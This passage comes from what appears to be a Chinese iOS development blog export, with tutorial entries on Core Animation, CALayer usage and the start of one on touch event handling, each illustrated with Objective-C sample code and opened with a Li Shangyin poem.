    <content type="text"><![CDATA[不辞鶗鴂妒年芳，但惜流尘暗烛房。昨夜西池凉露满，桂花吹断月中香。 李商隐 《昨夜》 CABasicAnimation CABasicAnimation是核心动画类簇中的一个类，是CAPropertyAnimation的子类，它的祖父是CAAnimation。它主要用于制作比较单一的动画，例如，平移、缩放、旋转、颜色渐变、边框的值的变化等，也就是将layer的某个属性值从一个值到另一个值的变化。 属性说明: fromValue： keyPath相应属性的初始值 toValue： keyPath相应属性的结束值 随着动画的进行，在长度为duration的持续时间内，keyPath相应属性的值从fromValue渐渐地变为toValue。 如果fillMode=kCAFillModeForwards和removedOnComletion=NO，那么在动画执行完毕后，图层会保持显示动画执行后的状态。 但在实质上，图层的属性值还是动画执行前的初始值，并没有真正被改变。 比如，CALayer的position初始值为(0,0)，CABasicAnimation的fromValue为(10,10)，toValue为(100,100)，虽然动画执行完毕后图层保持在(100,100)这个位置，实质上图层的position还是为(0,0)。 keyPath(官方文档截图) 3D的形变属性 在文档的CATransform3D key paths 这个位置查看keyPath的属性和包装的数值。 12345678910111213141516171819202122232425/** X Y 轴的动画 */- (void)demoTransform&#123; // 创建基本动画 CABasicAnimation *anim = [CABasicAnimation animation]; // keyPath决定了执行怎样的动画(什么属性的动画) anim.keyPath = @"transform.translation.y"; // toValue : 达到到的数值 // byValue : 增加某一个数值 anim.toValue = @(250);// anim.toValue = [NSValue valueWithCATransform3D:CATransform3DMakeScale(0.5, 2, 0)]; // 动画的执行时间 anim.duration = 2.0;#pragma mark - 让图层保持在动画执行完的状态 一定要加这两句 // 动画执行完不要移除 anim.removedOnCompletion = NO; // 保持在目前的状态位置 anim.fillMode = kCAFillModeForwards; [self.layer addAnimation:anim forKey:nil]; // forKey是用来标记动画 移除的时候用&#125; 位置属性的基本动画1234567891011121314151617181920212223/** 位置属性的基本动画 */- (void)demoPosition&#123; // 创建基本动画 CABasicAnimation *anim = [CABasicAnimation animation]; // keyPath决定了执行怎样的动画(什么属性的动画) anim.keyPath = @"position.x"; // toValue : 达到到的数值 // byValue : 增加某一个数值 anim.toValue = [NSValue valueWithCGPoint:CGPointMake(250, 250)]; anim.byValue = [NSValue valueWithCGPoint:CGPointMake(250, 250)];#pragma mark - 让图层保持在动画执行完的状态 一定要加这两句 // 动画执行完不要移除 anim.removedOnCompletion = NO; // 保持在目前的状态位置 anim.fillMode = kCAFillModeForwards; [self.layer addAnimation:anim forKey:nil]; // forKey是用来标记动画 移除的时候用&#125; 旋转属性的基本动画12345678910111213141516171819202122232425/** 旋转属性的基本动画 */- (void)demoRotation&#123; // 创建基本动画 CABasicAnimation *anim = [CABasicAnimation animation]; // keyPath决定了执行怎样的动画(什么属性的动画) anim.keyPath = @"transform.rotation"; // toValue : 达到到的数值 // byValue : 增加某一个数值 anim.toValue = [NSValue valueWithCATransform3D:CATransform3DMakeRotation(M_2_PI, 1, -1, 0)];// anim.byValue = [NSValue valueWithCGPoint:CGPointMake(250, 250)]; // 动画的执行时间 anim.duration = 2.0;#pragma mark - 让图层保持在动画执行完的状态 一定要加这两句 // 动画执行完不要移除 anim.removedOnCompletion = NO; // 保持在目前的状态位置 anim.fillMode = kCAFillModeForwards; [self.layer addAnimation:anim forKey:nil]; // forKey是用来标记动画 移除的时候用&#125; 缩放属性的基本动画123456789101112131415161718192021222324252627/** 缩放属性的基本动画 */- (void)demoScale&#123; // 创建基本动画 CABasicAnimation *anim = [CABasicAnimation animation]; // keyPath决定了执行怎样的动画(什么属性的动画) anim.keyPath = @"transform.scale";// anim.keyPath = @"transform";// anim.keyPath = @"bounds";// // toValue : 达到到的数值 // byValue : 增加某一个数值 anim.toValue = [NSValue valueWithCATransform3D:CATransform3DMakeScale(0.5, 2, 0)]; // anim.byValue = [NSValue valueWithCGPoint:CGPointMake(250, 250)]; // 动画的执行时间 anim.duration = 2.0;#pragma mark - 让图层保持在动画执行完的状态 一定要加这两句 // 动画执行完不要移除 anim.removedOnCompletion = NO; // 保持在目前的状态位置 anim.fillMode = kCAFillModeForwards; [self.layer addAnimation:anim forKey:nil]; // forKey是用来标记动画 移除的时候用&#125; keyFrameAnimation （关键帧动画） keyFrameAnimation是CApropertyAnimation的子类，跟CABasicAnimation的区别是： CABasicAnimation只能从一个数值(fromValue)变到另一个数值(toValue) 而CAKeyframeAnimation会使用一个NSArray保存这些数值 属性说明： values：就是上述的NSArray对象。里面的元素称为”关键帧”(keyframe)。动画对象会在指定的时间(duration)内，依次显示values数组中的每一个关键帧 path：可以设置一个CGPathRef\CGMutablePathRef,让层跟着路径移动。path只对CALayer的anchorPoint和position起作用。如果你设置了path，那么values将被忽略。 keyTimes：可以为对应的关键帧指定对应的时间点,其取值范围为0到1.0。keyTimes中的每一个时间值都对应values中的每一帧.当keyTimes没有设置的时候,各个关键帧的时间是平分的。 CABasicAnimation可看做是最多只有2个关键帧的CAKeyframeAnimation。 帧动画的基本使用123456789101112131415161718192021222324- (void)demo&#123; // 创建帧动画 CAKeyframeAnimation *anim = [CAKeyframeAnimation animation]; anim.keyPath = @"position"; // 可以添加多个值执行动画 NSValue *value1 = [NSValue valueWithCGPoint:CGPointZero]; NSValue *value2 = [NSValue valueWithCGPoint:CGPointMake(50, 50)]; NSValue *value3 = [NSValue valueWithCGPoint:CGPointMake(100, 150)]; NSValue *value4 = [NSValue valueWithCGPoint:CGPointMake(250, 50)]; anim.values = @[value1,value2,value3,value4]; // 持续时间两秒 anim.duration = 2.0; // 动画过后保持现在的状态 anim.removedOnCompletion = NO; anim.fillMode = kCAFillModeForwards; // 添加动画 [self.purpleView.layer addAnimation:anim forKey:nil];&#125; animation.path方法123456789101112131415161718192021222324252627282930313233343536373839/** 让view沿着绘制的路径执行动画 */- (void)demoCircle&#123; // 创建动画 CAKeyframeAnimation *anim = [CAKeyframeAnimation animation]; anim.keyPath = @"position"; anim.removedOnCompletion = NO; anim.fillMode = kCAFillModeForwards; anim.duration = 2.0; // 绘制圆路径 CGMutablePathRef path = CGPathCreateMutable(); CGPathAddEllipseInRect(path, NULL, CGRectMake(100, 100, 250, 250)); anim.path = path; CGPathRelease(path); // 有创建就要手动 release anim.delegate = self; // 代理就是view 不需要遵守协议 // 动画方程(动画的执行方式) anim.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut]; // 添加动画 [self.purpleView.layer addAnimation:anim forKey:nil];&#125;#pragma mark - Animation代理方法/** 动画开始调用的方法 */- (void)animationDidStart:(CAAnimation *)anim&#123; NSLog(@"%s",__func__);&#125;/** 动画执行结束调用的方法 */- (void)animationDidStop:(CAAnimation *)anim finished:(BOOL)flag&#123; NSLog(@"%s",__func__);&#125; 图标抖动(模仿App删除)123456789101112131415161718192021- (IBAction)star &#123; CAKeyframeAnimation *anim = [CAKeyframeAnimation animation]; anim.keyPath = @"transform.rotation"; // 设置摆动角度 anim.values = @[@(Angle2Radian(-7)),@(Angle2Radian(7)),@(Angle2Radian(-7))]; anim.duration = 0.15; // 执行次数 anim.repeatCount = CGFLOAT_MAX; anim.removedOnCompletion = NO; anim.fillMode = kCAFillModeForwards; [self.iconView.layer addAnimation:anim forKey:@"shake"];&#125;- (IBAction)stop &#123; [self.iconView.layer removeAnimationForKey:@"shake"];&#125; CATransition CAAnimation的子类，用于做转场动画，能够为层提供移出屏幕和移入屏幕的动画效果。iOS比Mac OS X的转场动画效果少一点。 UINavigationController就是通过CATransition实现了将控制器的视图推入屏幕的动画效果。 属性解析: type：动画过渡类型 subtype：动画过渡方向 startProgress：动画起点(在整体动画的百分比) endProgress：动画终点(在整体动画的百分比) 转场动画过渡效果 CAAnimationGroup CAAnimation的子类，可以保存一组动画对象，将CAAnimationGroup对象加入层后，组中所有动画对象可以同时并发运行。 属性解析： animations：用来保存一组动画对象的NSArray。 默认情况下，一组动画对象是同时运行的，也可以通过设置动画对象的beginTime属性来更改动画的开始时间。 1234567891011121314151617181920212223// 将多个核心动画放在动画组里面一起执行- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event&#123; // 动画1 CABasicAnimation *animRotate = [CABasicAnimation animation]; animRotate.keyPath = @"transform.rotation"; animRotate.toValue = @(M_2_PI); // 动画2 CABasicAnimation *animScale= [CABasicAnimation animation]; animScale.keyPath = @"transform.scale"; animScale.toValue = @(0.5); // 动画3 CABasicAnimation *animTranslate = [CABasicAnimation animation]; animTranslate.keyPath = @"transform.translation"; animTranslate.toValue = @(100); // 放在动画组里面 CAAnimationGroup *animGroup = [CAAnimationGroup animation]; animGroup.animations = @[animRotate,animScale,animTranslate]; animGroup.removedOnCompletion = NO; animGroup.fillMode = kCAFillModeForwards; animGroup.duration = 3.0; [self.cyanView.layer addAnimation:animGroup forKey:nil];&#125; UIView动画封装 UIKit直接将动画集成到UIView类中，当内部的一些属性发生改变时，UIView将为这些改变提供动画支持。 执行动画所需要的工作由UIView类自动完成，但仍要在希望执行动画时通知视图，为此需要将改变属性的代码放在[UIView beginAnimations:nil context:nil]和[UIView commitAnimations]之间。 常见方法解析: 1234567891011121314151617181920212223242526272829// 设置动画代理对象，当动画开始或者结束时会发消息给代理对象+ (void)setAnimationDelegate:(id)delegate// 当动画即将开始时，执行delegate对象的selector，并且把beginAnimations:context:中传入的参数传进selector+ (void)setAnimationWillStartSelector:(SEL)selector// 当动画结束时，执行delegate对象的selector，并且把beginAnimations:context:中传入的参数传进selector+ (void)setAnimationDidStopSelector:(SEL)selector// 动画的持续时间，秒为单位+ (void)setAnimationDuration:(NSTimeInterval)duration// 动画延迟delay秒后再开始+ (void)setAnimationDelay:(NSTimeInterval)delay// 动画的开始时间，默认为now+ (void)setAnimationStartDate:(NSDate *)startDate// 动画的节奏控制,具体看下面的”备注”+ (void)setAnimationCurve:(UIViewAnimationCurve)curve// 动画的重复次数+ (void)setAnimationRepeatCount:(float)repeatCount// 如果设置为YES,代表动画每次重复执行的效果会跟上一次相反+ (void)setAnimationRepeatAutoreverses:(BOOL)repeatAutoreverses// 设置视图view的过渡效果, transition指定过渡类型, cache设置YES代表使用视图缓存，性能较好+ (void)setAnimationTransition:(UIViewAnimationTransition)transition forView:(UIView *)view cache:(BOOL)cache Block动画动画1 duration：动画的持续时间 delay：动画延迟delay秒后开始 options：动画的节奏控制 animations：将改变视图属性的代码放在这个block中 completion：动画结束后，会自动调用这个block 1+ (void)animateWithDuration:(NSTimeInterval)duration delay:(NSTimeInterval)delay options:(UIViewAnimationOptions)options animations:(void (^)(void))animations completion:(void (^)(BOOL finished))completion 动画2 duration：动画的持续时间 view：需要进行转场动画的视图 options：转场动画的类型 animations：将改变视图属性的代码放在这个block中 completion：动画结束后，会自动调用这个block 1+ (void)transitionWithView:(UIView *)view duration:(NSTimeInterval)duration options:(UIViewAnimationOptions)options animations:(void (^)(void))animations completion:(void (^)(BOOL finished))completion 动画3 duration：动画的持续时间 options：转场动画的类型 animations：将改变视图属性的代码放在这个block中 completion：动画结束后，会自动调用这个block 1+ (void)transitionFromView:(UIView *)fromView toView:(UIView *)toView duration:(NSTimeInterval)duration options:(UIViewAnimationOptions)options completion:(void (^)(BOOL finished))completion 方法调用完毕后，相当于执行了下面两句代码： 1234// 添加toView到父视图[fromView.superview addSubview:toView];// 把fromView从父视图中移除[fromView.superview removeFromSuperview]; UIImageView的帧动画 UIImageView可以让一系列的图片在特定的时间内按顺序显示。 相关属性解析: animationImages：要显示的图片(一个装着UIImage的NSArray)。 animationDuration：完整地显示一次animationImages中的所有图片所需的时间。 animationRepeatCount：动画的执行次数(默认为0，代表无限循环)。 相关方法解析: 123- (void)startAnimating; 开始动画- (void)stopAnimating; 停止动画- (BOOL)isAnimating; 是否正在运行动画 UIActivityIndicatorView 是一个旋转进度轮，可以用来告知用户有一个操作正在进行中，一般用initWithActivityIndicatorStyle初始化。 UIActivityIndicatorViewStyle有3个值可供选择： UIActivityIndicatorViewStyleWhiteLarge：大型白色指示器 UIActivityIndicatorViewStyleWhite：标准尺寸白色指示器 UIActivityIndicatorViewStyleGray：灰色指示器，用于白色背景 方法解析: 123- (void)startAnimating; 开始动画- (void)stopAnimating; 停止动画- (BOOL)isAnimating; 是否正在运行动画]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>CAAnimation</tag>
        <tag>CALayer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之核心动画（一）：了解核心动画及CALayer常用方法介绍]]></title>
    <url>%2Farchives%2F4bdf0e86.html</url>
    <content type="text"><![CDATA[飒飒东风细雨来，芙蓉塘外有轻雷。金蟾啮锁烧香入，玉虎牵丝汲井回。贾氏窥帘韩掾少，宓妃留枕魏王才。春心莫共花争发，一寸相思一寸灰！ 李商隐 《无题·飒飒东风细雨来》 核心动画介绍本质 核心动画都是假象，并不会改变layer的属性值 而UIView只有属性改变才会有动画 使用场景: 如果在执行过程中不需要用户交互，就可以用核心动画 在转场动画中，核心动画用得比较多 CAAnimation的继承结构： 要想执行动画，就必须初始化一个CAAnimation对象。 其实，一般情况下，我们使用的比较多的是CAAnimation的子类，因此，先大致看看CAAnimation的继承结构： CAAnimation 所有动画对象的父类，负责控制动画的持续时间和速度，是个抽象类，不能直接使用，应该使用它具体的子类。 属性解析： duration：动画的持续时间 repeatCount：动画的重复次数 repeatDuration：动画的重复时间 removedOnCompletion：默认为YES，代表动画执行完毕后就从图层上移除，图形会恢复到动画执行前的状态。如果想让图层保持显示动画执行后的状态，那就设置为NO，不过还要设置fillMode为kCAFillModeForwards fillMode：决定当前对象在非active时间段的行为.比如动画开始之前，动画结束之后 beginTime：可以用来设置动画延迟执行时间，若想延迟2s，就设置为CACurrentMediaTime()+2，CACurrentMediaTime()为图层的当前时间 timingFunction：速度控制函数，控制动画运行的节奏 delegate：动画代理 timingFunction可选的值有： 12345678// （线性）：匀速，给你一个相对静态的感觉kCAMediaTimingFunctionLinear// （渐进）：动画缓慢进入，然后加速离开kCAMediaTimingFunctionEaseIn// （渐出）：动画全速进入，然后减速的到达目的地kCAMediaTimingFunctionEaseOut// （渐进渐出）：动画缓慢的进入，中间加速，然后减速的到达目的地。这个是默认的动画行为。kCAMediaTimingFunctionEaseInEaseOut CAAnimation——动画代理方法1234567891011121314// CAAnimation在分类中定义了代理方法@interface NSObject (CAAnimationDelegate)/* Called when the animation begins its active duration. */- (void)animationDidStart:(CAAnimation *)anim;/* Called when the animation either completes its active duration or * is removed from the object it is attached to (i.e. the layer). 'flag' * is true if the animation reached the end of its active duration * without being removed. */- (void)animationDidStop:(CAAnimation *)anim finished:(BOOL)flag;@end CAPropertyAnimation 是CAAnimation的子类，也是个抽象类，要想创建动画对象，应该使用它的两个子类：CABasicAnimation和CAKeyframeAnimation 属性说明： keyPath：通过指定CALayer的一个属性名称为keyPath(NSString类型)，并且对CALayer的这个属性的值进行修改，达到相应的动画效果。 比如，指定@”position”为keyPath，就修改CALayer的position属性的值，以达到平移的动画效果。 CALayer 在iOS中，你能看得见摸得着的东西基本上都是UIView，比如一个按钮、一个文本标签、一个文本输入框、一个图标等等，这些都是UIView。 其实UIView之所以能显示在屏幕上，完全是因为它内部的一个图层。 在创建UIView对象时，UIView内部会自动创建一个图层(即CALayer对象)，通过UIView的layer属性可以访问这个层。 1@property(nonatomic，readonly，retain) CALayer *layer; 当UIView需要显示到屏幕上时，会调用drawRect:方法进行绘图，并且会将所有内容绘制在自己的图层上，绘图完毕后，系统会将图层拷贝到屏幕上，于是就完成了UIView的显示。 换句话说，UIView本身不具备显示的功能，是它内部的层才有显示功能。 图层的常见属性应用1234567891011121314151617181920212223242526272829303132333435/** 图像图层的属性 */- (void)demoImageView&#123; // 设置头像的边框和颜色 self.iconVIew.layer.borderWidth = 5; self.iconVIew.layer.borderColor = [UIColor blackColor].CGColor; // 设置圆角半径 self.iconVIew.layer.cornerRadius = 10;#warning 只有设置这个图片的圆角才会出来 (因为图片不是加在主层上的 是在子层上面)// self.iconVIew.clipsToBounds = YES; // 设置阴影和颜色#warning 裁剪的话就不会有阴影效果 这两个属性不能共存 self.iconVIew.layer.shadowOffset = CGSizeMake(20， 20); self.iconVIew.layer.shadowColor = [UIColor blackColor].CGColor; self.iconVIew.layer.shadowOpacity = 0.5; // 不透明度 默认阴影是透明的&#125;/** view的图层的设置 */- (void)demoView&#123; // 设置边框和颜色 self.cyanView.layer.borderWidth = 10; self.cyanView.layer.borderColor = [UIColor redColor].CGColor; // 设置圆角半径 self.cyanView.layer.cornerRadius = 10; // 设置阴影和颜色 self.cyanView.layer.shadowOffset = CGSizeMake(20， 20); self.cyanView.layer.shadowColor = [UIColor blackColor].CGColor; self.cyanView.layer.shadowOpacity = 0.5; // 不透明度 默认阴影是透明的&#125; 图层的形变属性12345678910111213141516171819202122232425/** transfor属性 */- (IBAction)btnClick &#123; // 3D属性 多了个Y轴 (作用于图层) self.iconVIew.layer.transform = CATransform3DMakeTranslation(50， 50， 0); self.iconVIew.transform = CGAffineTransformMakeTranslation(50， 50); // X Y Z 三条轴 形成一个旋转轴 (左上角(0，0) 右下角(1，1) self.iconVIew.layer.transform = CATransform3DMakeRotation(M_2_PI， 1， 1， 0); // 只能平面旋转 self.iconVIew.transform = CGAffineTransformMakeRotation(M_2_PI); // 可以用KVC得方式赋值 (可以传递哪些key path， 在官方文档搜索 "CATransform3D key paths") [self.iconVIew.layer setValue:@(M_2_PI) forKeyPath:@"transform.rotation"]; [self.iconVIew.layer setValue:@(100) forKeyPath:@"transform.translation.x"]; NSValue *value = [NSValue valueWithCATransform3D:CATransform3DMakeRotation(M_2_PI， 1， 1， 0)]; [self.iconVIew.layer setValue:value forKeyPath:@"transform"]; NSValue *value1 = [NSValue valueWithCATransform3D:CATransform3DMakeScale(1， 2， 0)]; [self.iconVIew.layer setValue:value1 forKeyPath:@"transform"];&#125;; 自定义图层 UIView *view; view.layer.delegate == view; view的完整显示过程 view.layer会准备一个Layer Graphics Contex(图层类型的上下文) 调用view.layer.delegate(view)的drawLayer:inContext:，并传入刚才准备好的上下文 view的drawLayer:inContext:方法内部又会调用view的drawRect:方法 view就可以在drawRect:方法中实现绘图代码， 所有东西最终都绘制到view.layer上面 系统再将view.layer的内容拷贝到屏幕，于是完成了view的显示 自定义层，其实就是在层上绘图，一共有2种方法，下面详细介绍一下。 自定义图层方法1 方法描述：创建一个CALayer的子类，然后覆盖drawInContext:方法，使用Quartz2D API进行绘图 123456789101112131415161718192021222324252627282930313233343536- (void)diyLayer&#123; XSLayer *layer = [XSLayer layer]; layer.bounds = CGRectMake(0， 0， 100， 100); layer.backgroundColor = [UIColor redColor].CGColor; layer.anchorPoint = CGPointZero; layer.position = CGPointMake(100， 100); layer.delegate = self; // 只有明显地调用setNeedsDisplay方法，才会调用drawInContext:方法进行绘制 [layer setNeedsDisplay]; [self.view.layer addSublayer:layer]; &#125;- (void)demoLayer&#123; CALayer *layer = [CALayer layer]; layer.bounds = CGRectMake(0， 0， 100， 100); layer.backgroundColor = [UIColor redColor].CGColor; layer.anchorPoint = CGPointZero; // 决定了position的位置 layer.position = CGPointMake(100， 100); layer.delegate = self; // 只有明显地调用setNeedsDisplay方法，才会调用drawInContext:方法进行绘制 [layer setNeedsDisplay]; [self.view.layer addSublayer:layer];&#125;#pragma mark - 代理方法- (void)drawLayer:(CALayer *)layer inContext:(CGContextRef)ctx&#123; // 设置颜色 CGContextSetRGBFillColor(ctx， 0， 1， 0， 1); // 画圆 CGContextAddEllipseInRect(ctx， CGRectMake(50， 50， 50， 50)); // 渲染 CGContextFillPath(ctx);&#125; 自定义的图层方法2 方法描述：创建一个CALayer的子类，然后覆盖drawInContext:方法，使用uartz2D API进进行绘图 123456789101112131415#import "XSLayer.h"@implementation XSLayer/** 只有明显地调用setNeedsDisplay方法，才会调用drawInContext:方法进行绘制 */- (void)drawInContext:(CGContextRef)ctx&#123; // 设置颜色 CGContextSetRGBFillColor(ctx， 0， 0， 1， 1); // 画圆 CGContextAddRect(ctx， CGRectMake(0， 0， 50， 50)); // 渲染 CGContextFillPath(ctx);&#125;@end CALayer上动画的暂停和恢复1234567891011121314151617181920212223242526#pragma mark 暂停CALayer的动画-(void)pauseLayer:(CALayer*)layer&#123; CFTimeInterval pausedTime = [layer convertTime:CACurrentMediaTime() fromLayer:nil]; // 让CALayer的时间停止走动 layer.speed = 0.0; // 让CALayer的时间停留在pausedTime这个时刻 layer.timeOffset = pausedTime;&#125;#pragma mark 恢复CALayer的动画-(void)resumeLayer:(CALayer*)layer&#123; CFTimeInterval pausedTime = layer.timeOffset; // 1. 让CALayer的时间继续行走 layer.speed = 1.0; // 2. 取消上次记录的停留时刻 layer.timeOffset = 0.0; // 3. 取消上次设置的时间 layer.beginTime = 0.0; // 4. 计算暂停的时间(这里也可以用CACurrentMediaTime()-pausedTime) CFTimeInterval timeSincePause = [layer convertTime:CACurrentMediaTime() fromLayer:nil] - pausedTime; // 5. 设置相对于父坐标系的开始时间(往后退timeSincePause) layer.beginTime = timeSincePause;&#125; 隐式动画 每一个UIView内部都默认关联着一个CALayer，我们可用称这个Layer为Root Layer（根层） 所有的非Root Layer，也就是手动创建的CALayer对象，都存在着隐式动画 什么是隐式动画？ 当对非RootLayer的部分属性进行修改时，默认会自动产生一些动画效果,而这些属性称为AnimatableProperties(可动画属性) 列举几个常见的Animatable Properties： bounds：用于设置CALayer的宽度和高度。修改这个属性会产生缩放动画 backgroundColor：用于设置CALayer的背景色。修改这个属性会产生背景色的渐变动画 position：用于设置CALayer的位置。修改这个属性会产生平移动画 事务 可以通过动画事务(CATransaction)关闭默认的隐式动画效果 1234[CATransaction begin];[CATransaction setDisableActions:YES];self.myview.layer.position = CGPointMake(10, 10);[CATransaction commit]; CALayer注意点关于CALayer的疑惑 为什么CALayer中使用CGColorRef和CGImageRef这2种数据类型，而不用UIColor和UIImage？ 首先 CALayer是定义在QuartzCore框架中的，CGImageRef、CGColorRef两种数据类型是定义在CoreGraphics框架中的。 UIColor、UIImage是定义在UIKit框架中的。 其次 QuartzCore框架和CoreGraphics框架是可以跨平台使用的，在iOS和Mac OS X上都能使用。 但是UIKit只能在iOS中使用。 为了保证可移植性，QuartzCore不能使用UIImage、UIColor，只能使用CGImageRef、CGColorRef。 UIView和CALayer的选择 通过CALayer，就能做出跟UIImageView一样的界面效果，既然CALayer和UIView都能实现相同的显示效果，那究竟该选择谁好呢？ 其实，对比CALayer，UIView多了一个事件处理的功能。也就是说，CALayer不能处理用户的触摸事件，而UIView可以。 所以，如果显示出来的东西需要跟用户进行交互的话，用UIView；如果不需要跟用户进行交互，用UIView或者CALayer都可以。 当然，CALayer的性能会高一些，因为它少了事件处理的功能，更加轻量级。 position和anchorPoint CALayer有2个非常重要的属性：position和anchorPoint 123456789// 用来设置CALayer在父层中的位置// 以父层的左上角为原点(0, 0)@property CGPoint position;// 称为“定位点”、“锚点”// 决定着CALayer身上的哪个点会在position属性所指的位置// 以自己的左上角为原点(0, 0)// 它的x、y取值范围都是0~1，默认值为（0.5, 0.5）(即中心点)@property CGPoint anchorPoint; UIView和CALayer的其他关系 UIView可以通过subviews属性访问所有的子视图，类似地，CALayer也可以通过sublayers属性访问所有的子层 UIView可以通过superview属性访问父视图，类似地，CALayer也可以通过superlayer属性访问父层 下面再看一张UIView和CALayer的关系图： 如果两个UIView是父子关系，那么它们内部的CALayer也是父子关系。 常用的CALayer子类CAReplicatorLayer（复制层） 结合音量振动条的简单使用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647- (void)viewDidLoad &#123; [super viewDidLoad]; // 创建复制层 CAReplicatorLayer *repLayer = [CAReplicatorLayer layer]; repLayer.frame = self.musicView.bounds; // 设置复制份数(表示的是复制层内所有的空间为一份 复制的总的份数) repLayer.instanceCount = 5; // 设置复制层的形变(相对于上一个) repLayer.instanceTransform = CATransform3DMakeTranslation(40, 0, 0); // 复制层(每一份)的动画间隔时间 (相对于上一ge) repLayer.instanceDelay = 0.3; // 添加复制层 [self.musicView.layer addSublayer:repLayer]; // 创建单个音乐震动条 CALayer *redLayer = [CALayer layer]; redLayer.backgroundColor = [UIColor redColor].CGColor; // 设置锚点 redLayer.anchorPoint = CGPointMake(0, 1); // 设置position redLayer.position = CGPointMake(0, 200); CGFloat redLayerX = 0; CGFloat redLayerY = 0; CGFloat redLayerW = 30; CGFloat redLayerH = 100; redLayer.bounds = CGRectMake(redLayerX, redLayerY, redLayerW, redLayerH); [repLayer addSublayer:redLayer]; // 添加动画 CABasicAnimation *anim = [CABasicAnimation animation]; anim.keyPath = @"transform.scale.y"; anim.toValue = @0; anim.repeatCount = MAXFLOAT; anim.duration = .5; // 设置翻转动画(即是恢复时候的动画) repLayer.autoreverses = YES; // 添加动画 [redLayer addAnimation:anim forKey:nil];&#125; CAGradientLayer（渐变层）123456789101112131415161718192021222324252627282930313233343536#pragma mark - 用渐变层给下半部分添加阴影 CAGradientLayer *gradientLayer = [CAGradientLayer layer]; // 渐变颜色 (从一个颜色到另一个颜色过渡) gradientLayer.colors = @[(id)[UIColor clearColor].CGColor,(id)[UIColor blackColor].CGColor]; // 设置渐变层的frame gradientLayer.frame = self.bottomImageView.bounds; // 设置不透明度 (一开始是0 不显示) gradientLayer.opacity = 0;// // 设置渐变的位置// gradientLayer.locations = @[@2,@5]; // 设置渐变的方向// gradientLayer.startPoint// gradientLayer.endPoint [self.bottomImageView.layer addSublayer:gradientLayer]; self.gradientLayer = gradientLayer;if (sender.state == UIGestureRecognizerStateEnded) &#123;// 阴影设置为0self.gradientLayer.opacity = 0;// 设置松手回弹的时候的弹簧效果[UIView animateWithDuration:1 delay:0 usingSpringWithDamping:.2 initialSpringVelocity:0 options:UIViewAnimationOptionCurveEaseInOut animations:^&#123;// 还原形变self.self.topImageView.layer.transform = CATransform3DIdentity;&#125; completion:^(BOOL finished) &#123;&#125;]; CAShapeLayer（形状图层） 结合QQ bage消息的粘性计算实例 1234567891011121314- (CAShapeLayer *)shapeLayer&#123; if (!_shapeLayer) &#123; // 可以根据一个路径生成一个图层 CAShapeLayer *shapeLayer = [CAShapeLayer layer]; shapeLayer.fillColor = [UIColor redColor].CGColor; [self.superview.layer insertSublayer:shapeLayer atIndex:0]; self.shapeLayer = shapeLayer; &#125; return _shapeLayer;&#125;// 设置形状图层的路径self.shapeLayer.path = path.CGPath; QQ bage消息的粘性计算图 计算方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// 计算不规则的矩形路径- (UIBezierPath *)pathWithSmallView:(UIView *)smallView bigView:(UIView *)bigView&#123; // 计算圆心 CGFloat d = [self distanceBetweenBigCirle:bigView andSmallCircle:smallView]; CGFloat y1 = smallView.center.y; CGFloat x1 = smallView.center.x; CGFloat r1 = smallView.layer.cornerRadius; CGFloat y2 = bigView.center.y; CGFloat x2 = bigView.center.x; CGFloat r2 = bigView.layer.cornerRadius; if (d == 0) return nil; // cosθ CGFloat cosθ = (y2 - y1) / d; // sinθ CGFloat sinθ = (x2 - x1) / d; // A: CGPoint pointA = CGPointMake(x1 - r1 * cosθ, y1 + r1 * sinθ); // B: CGPoint pointB = CGPointMake(x1 + r1 * cosθ, y1 - r1 * sinθ); // C: CGPoint pointC = CGPointMake(x2 + r2 * cosθ, y2 - r2 * sinθ); // D: CGPoint pointD = CGPointMake(x2 - r2 * cosθ, y2 + r2 * sinθ); // O: CGPoint pointO = CGPointMake(pointA.x + d * 0.5 * sinθ, pointA.y + d * 0.5 * cosθ); // P: CGPoint pointP = CGPointMake(pointB.x + d * 0.5 * sinθ, pointB.y + d * 0.5 * cosθ); // 描述路径 UIBezierPath *path = [UIBezierPath bezierPath]; [path moveToPoint:pointA]; // AB [path addLineToPoint:pointB]; // BC // 绘制曲线 [path addQuadCurveToPoint:pointC controlPoint:pointP]; // CD [path addLineToPoint:pointD]; // DA [path addQuadCurveToPoint:pointA controlPoint:pointO]; return path;&#125;]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>CAAnimation</tag>
        <tag>CALayer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之事件响应及处理]]></title>
    <url>%2Farchives%2Fbb2b9a9.html</url>
    <content type="text"><![CDATA[凄凉宝剑篇，羁泊欲穷年。黄叶仍风雨，青楼自管弦。新知遭薄俗，旧好隔良缘。心断新丰酒，销愁斗几千。 李商隐 《风雨》 响应者对象 在iOS中不是任何对象都能处理事件，只有继承了UIResponder的对象才能接收并处理事件。我们称之为“响应者对象” UIApplication、UIViewController、UIView都继承自UIResponder，因此它们都是响应者对象，都能够接收并处理事件 UIResponder内部提供了以下方法来处理事件 12345678910111213// 触摸事件- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event;- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event;- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event;- (void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event;// 加速计事件- (void)motionBegan:(UIEventSubtype)motion withEvent:(UIEvent *)event;- (void)motionEnded:(UIEventSubtype)motion withEvent:(UIEvent *)event;- (void)motionCancelled:(UIEventSubtype)motion withEvent:(UIEvent *)event;// 远程控制事件- (void)remoteControlReceivedWithEvent:(UIEvent *)event; UIView是UIResponder的子类，可以覆盖下列4个方法处理不同的触摸事件 12345678910111213// 一根或者多根手指开始触摸view，系统会自动调用view的下面方法- (void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event// 一根或者多根手指在view上移动，系统会自动调用view的下面方法（随着手指的移动，会持续调用该方法）- (void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event// 一根或者多根手指离开view，系统会自动调用view的下面方法- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event// 